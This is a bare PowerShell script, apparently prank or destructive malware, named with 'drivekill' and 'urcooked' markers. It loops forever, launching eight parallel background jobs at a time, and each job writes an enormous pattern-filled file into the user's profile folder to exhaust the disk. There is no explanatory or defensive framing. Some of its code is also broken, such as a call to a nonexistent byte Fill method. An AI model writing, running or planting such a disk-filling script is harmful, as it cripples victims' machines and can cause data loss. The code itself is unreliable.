$Prefix = "urcooked"
$OutDir = Join-Path $env:USERPROFILE "drivekill"
$TargetBytes = 99999GB
$ParallelFiles = 8
$ChunkSizeMB = 4096
$PatternByte = 0x45,0x54,0x41 # "ETA"

if (-not (Test-Path $OutDir)) { New-Item -ItemType Directory -Path $OutDir | Out-Null }
$ChunkBytes = New-Object byte[] ($ChunkSizeMB * 1MB)
[byte]::Fill($ChunkBytes, $PatternByte)

function Fill-File([int]$Index) {
    $FilePath = Join-Path $OutDir ("$Prefix$Index.dat")
    $fs = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::OpenOrCreate,
                                 [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
    try {
        $FullChunks = [math]::Floor($TargetBytes / $ChunkBytes.Length)
        $RemainingBytes = $TargetBytes % $ChunkBytes.Length
        for ($i=0; $i -lt $FullChunks; $i++) { $fs.Write($ChunkBytes,0,$ChunkBytes.Length) }
        if ($RemainingBytes -gt 0) { $fs.Write($ChunkBytes,0,$RemainingBytes) }
    } finally {
        $fs.Close()
    }
}

$fileIndex = 0
while ($true) {
    $jobs = @()
    for ($i = 0; $i -lt $ParallelFiles; $i++) {
        $currentIndex = $fileIndex + $i
        $jobs += Start-Job -ScriptBlock { param($idx,$chunk,$target,$prefix,$out) 
            $ChunkBytes = $chunk
            $TargetBytes = $target
            $Prefix = $prefix
            $OutDir = $out
            function Fill-File([int]$Index) {
                $FilePath = Join-Path $OutDir ("$Prefix$Index.dat")
                $fs = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::OpenOrCreate,
                                             [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
                try {
                    $FullChunks = [math]::Floor($TargetBytes / $ChunkBytes.Length)
                    $RemainingBytes = $TargetBytes % $ChunkBytes.Length
                    for ($i=0; $i -lt $FullChunks; $i++) { $fs.Write($ChunkBytes,0,$ChunkBytes.Length) }
                    if ($RemainingBytes -gt 0) { $fs.Write($ChunkBytes,0,$RemainingBytes) }
                } finally { $fs.Close() }
            }
            Fill-File $idx
        } -ArgumentList $currentIndex,$ChunkBytes,$TargetBytes,$Prefix,$OutDir
    }
    $fileIndex += $ParallelFiles
    Wait-Job -Job $jobs
    Remove-Job -Job $jobs
}
